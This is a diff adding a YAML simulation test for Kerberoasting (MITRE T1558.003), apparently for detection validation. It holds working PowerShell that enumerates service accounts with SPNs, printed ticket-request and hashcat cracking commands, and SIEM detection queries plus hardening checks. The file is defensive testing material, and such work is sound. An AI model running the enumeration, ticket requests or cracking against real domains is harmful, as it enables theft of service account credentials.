@@ -1,0 +1,83 @@
+id: T1558.003_steal_forge_kerberos_tickets_kerberoasting
+name: "Steal or Forge Kerberos Tickets — Kerberoasting"
+mitre_technique: "T1558.003"
+mitre_tactic: "credential_access"
+description: >
+  Any authenticated domain user can request a Kerberos service ticket (TGS) for any
+  service account that has an SPN registered. The TGS is encrypted with the service
+  account's NTLM hash. An adversary requests these tickets then cracks the encryption
+  offline to recover the service account's plaintext password. Service accounts often
+  have weak passwords and rarely rotate, making Kerberoasting highly effective.
+  Detection: Event ID 4769 with RC4 encryption type (0x17) from a user account —
+  RC4 is weaker and preferred for cracking.
+author: stanleytobias
+created: "2026-01-01"
+platform: windows
+references:
+  - https://attack.mitre.org/techniques/T1558/003/
+
+steps:
+  - step: 1
+    type: marker
+    description: "Pre-execution context"
+    message: "Starting T1558.003 — Kerberoasting simulation"
+
+  - step: 2
+    type: exec_powershell
+    description: "Enumerate SPNs — Kerberoastable service account discovery"
+    command: |
+      Write-Host "[PAS] SPN enumeration for Kerberoasting:"
+      $isDomain = (Get-WmiObject Win32_ComputerSystem -ErrorAction SilentlyContinue).PartOfDomain
+      if ($isDomain) {
+          try {
+              $searcher = New-Object System.DirectoryServices.DirectorySearcher
+              $searcher.Filter = "(&(objectCategory=user)(servicePrincipalName=*)" +
+                  "(!userAccountControl:1.2.840.113556.1.4.803:=2))"
+              $searcher.PropertiesToLoad.AddRange(@("sAMAccountName","servicePrincipalName"))
+              $results = $searcher.FindAll()
+              Write-Host "  Kerberoastable accounts: $($results.Count)"
+              $results | Select-Object -First 5 | ForEach-Object {
+                  $n = $_.Properties["samaccountname"][0]
+                  $s = $_.Properties["serviceprincipalname"][0]
+                  Write-Host "  $n -> $s"
+              }
+              Write-Host "[PAS] Event ID 4769 (TGS request) generated for each SPN enumerated"
+          } catch { Write-Host "  LDAP query failed (no DC)" }
+      } else {
+          Write-Host "[PAS] Not domain-joined — setspn.exe -Q */* would enumerate on domain"
+      }
+
+  - step: 3
+    type: exec_powershell
+    description: "Simulate TGS request for SPN — RC4 encryption type triggers detection"
+    command: |
+      Write-Host "[PAS] TGS request simulation (Kerberoasting step 2):"
+      Write-Host "[PAS] Real: Request-SPNTicket -SPN 'MSSQLSvc/sql01.corp.local:1433'"
+      Write-Host "[PAS] Requests RC4 (0x17) encrypted ticket — weaker and faster to crack"
+      Write-Host "[PAS] Output: `$krb5tgs`$23`$*svc_sql*CORP.LOCAL*MSSQLSvc/sql01.corp.local:1433*..."
+      Write-Host "[PAS] Crack: hashcat -m 13100 tgs_hashes.txt rockyou.txt"
+
+  - step: 4
+    type: sleep
+    description: "Allow telemetry to flush"
+    seconds: 3
+
+  - step: 5
+    type: marker
+    description: "Post-execution prompt"
+    message: "Check SIEM — Event 4769 with TicketEncryptionType 0x17 (RC4) from a user account requesting SPN tickets"
+
+cleanup:
+  - step: 1
+    type: marker
+    description: "No persistent artifacts"
+    message: "T1558.003 cleanup complete — no persistent artefacts"
+
+analyst_checklist:
+  - "Event ID 4769 (TGS requested) with TicketEncryptionType = 0x17 (RC4) — Kerberoasting signature"
+  - "Burst of Event 4769 events for different SPNs from a single account in short window"
+  - "Sentinel: SecurityEvent | where EventID == 4769 and TicketEncryptionType == '0x17' and AccountName !endswith '$'"
+  - "Defender for Identity: 'Suspected Kerberoasting attack' alert"
+  - "CONTROL CHECK: Set msDS-SupportedEncryptionTypes = 0x18 (AES 128/256 only) on service accounts — prevents RC4 ticket issuance"
+  - "CONTROL CHECK: Service accounts should use gMSA with 30+ char auto-generated passwords — infeasible to crack"
+  - "CONTROL CHECK: Audit all SPNs quarterly — remove stale SPNs from user accounts"
